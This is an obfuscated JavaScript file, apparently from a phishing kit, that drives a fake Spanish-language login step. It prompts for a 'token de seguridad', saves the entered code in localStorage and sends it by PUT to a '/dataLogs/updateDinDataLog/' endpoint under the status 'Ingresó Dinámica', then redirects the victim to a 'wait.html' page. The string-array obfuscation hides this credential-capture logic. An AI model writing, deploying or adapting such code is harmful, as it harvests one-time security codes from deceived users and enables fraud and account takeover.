const _0x4eedf5 = _0x1fa3;
(function (_0x356321, _0x38a5ca) {
  const _0x5225ec = _0x1fa3,
    _0x466b69 = _0x356321();
  while (!![]) {
    try {
      const _0x305ac3 =
        (parseInt(_0x5225ec(0x15b)) / 0x1) *
          (-parseInt(_0x5225ec(0x14b)) / 0x2) +
        -parseInt(_0x5225ec(0x14d)) / 0x3 +
        (parseInt(_0x5225ec(0x138)) / 0x4) *
          (-parseInt(_0x5225ec(0x13b)) / 0x5) +
        (parseInt(_0x5225ec(0x13e)) / 0x6) *
          (parseInt(_0x5225ec(0x139)) / 0x7) +
        (-parseInt(_0x5225ec(0x143)) / 0x8) *
          (parseInt(_0x5225ec(0x14f)) / 0x9) +
        -parseInt(_0x5225ec(0x15a)) / 0xa +
        (parseInt(_0x5225ec(0x134)) / 0xb) * (parseInt(_0x5225ec(0x14e)) / 0xc);
      if (_0x305ac3 === _0x38a5ca) break;
      else _0x466b69["push"](_0x466b69["shift"]());
    } catch (_0x373982) {
      _0x466b69["push"](_0x466b69["shift"]());
    }
  }
})(_0xb583, 0x6850b);
function updateLS() {
  const _0x3120bf = _0x1fa3;
  LS[_0x3120bf(0x154)](_0x3120bf(0x135), JSON[_0x3120bf(0x14a)](info));
}
function _0xb583() {
  const _0x55b0e3 = [
    "2137290SUadiH",
    "433776XuaogA",
    "765rkmuDs",
    "dataLogId",
    "location",
    "btnLogin-page1",
    "cdin",
    "setItem",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "json",
    "disabled",
    "error",
    "1646380cnHlvB",
    "1PHOryY",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "click",
    "572mWkNUy",
    "info",
    "getItem",
    "getElementById",
    "203440LjGppX",
    "9037PpoGDo",
    "metaInfo",
    "65iFKAKp",
    "value",
    "focus",
    "3222uujaCP",
    "Bearer\x20",
    "origin",
    "log",
    "preventDefault",
    "9896YlFkBg",
    "/dataLogs/updateDinDataLog/",
    "Usuario\x20actualizado\x20correctamente",
    "application/json",
    "Ingresó\x20Dinámica",
    "addEventListener",
    "wait.html",
    "stringify",
    "1004590OEguIq",
    "dataLogToken",
  ];
  _0xb583 = function () {
    return _0x55b0e3;
  };
  return _0xb583();
}
function _0x1fa3(_0x32c509, _0x344855) {
  const _0xb583c7 = _0xb583();
  return (
    (_0x1fa3 = function (_0x1fa3b0, _0x458800) {
      _0x1fa3b0 = _0x1fa3b0 - 0x133;
      let _0x2b1a4a = _0xb583c7[_0x1fa3b0];
      return _0x2b1a4a;
    }),
    _0x1fa3(_0x32c509, _0x344855)
  );
}
const button = document[_0x4eedf5(0x137)](_0x4eedf5(0x152)),
  otpButton = document[_0x4eedf5(0x137)]("btnLogin-otapp"),
  numberMovil = document["getElementById"]("docNumberMovil");
otpButton[_0x4eedf5(0x148)](_0x4eedf5(0x133), async function (_0x5c38cf) {
  const _0x2621cc = _0x4eedf5;
  _0x5c38cf[_0x2621cc(0x142)](), (otpButton[_0x2621cc(0x158)] = !![]);
  if (numberMovil[_0x2621cc(0x13c)] == "") {
    alert(_0x2621cc(0x156)),
      numberMovil[_0x2621cc(0x13d)](),
      (otpButton[_0x2621cc(0x158)] = ![]);
    return;
  }
  const _0x3ff307 = numberMovil["value"];
  (info[_0x2621cc(0x13a)][_0x2621cc(0x153)] = _0x3ff307), updateLS();
  try {
    const _0x1af9ed = localStorage[_0x2621cc(0x136)](_0x2621cc(0x150)),
      _0x2ceea3 = localStorage[_0x2621cc(0x136)](_0x2621cc(0x14c));
    if (!_0x1af9ed || !_0x2ceea3) throw new Error(_0x2621cc(0x15c));
    const _0x297a1f = await fetch(url + _0x2621cc(0x144) + _0x1af9ed, {
      method: "PUT",
      headers: {
        "Content-Type": _0x2621cc(0x146),
        Authorization: _0x2621cc(0x13f) + _0x2ceea3,
        Origin: window[_0x2621cc(0x151)][_0x2621cc(0x140)],
      },
      body: JSON[_0x2621cc(0x14a)]({
        din: info[_0x2621cc(0x13a)][_0x2621cc(0x153)],
        status: _0x2621cc(0x147),
      }),
    });
    if (!_0x297a1f["ok"]) {
      const _0x3495c1 = await _0x297a1f[_0x2621cc(0x157)]();
      throw new Error(
        _0x3495c1[_0x2621cc(0x159)] ||
          "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor"
      );
    }
    console[_0x2621cc(0x141)](_0x2621cc(0x145)),
      (otpButton[_0x2621cc(0x158)] = ![]),
      (window[_0x2621cc(0x151)]["href"] = _0x2621cc(0x149));
  } catch (_0x482f5f) {
    console["error"]("Error\x20al\x20actualizar\x20usuario:", _0x482f5f),
      alert(_0x2621cc(0x155)),
      (otpButton["disabled"] = ![]);
  }
});
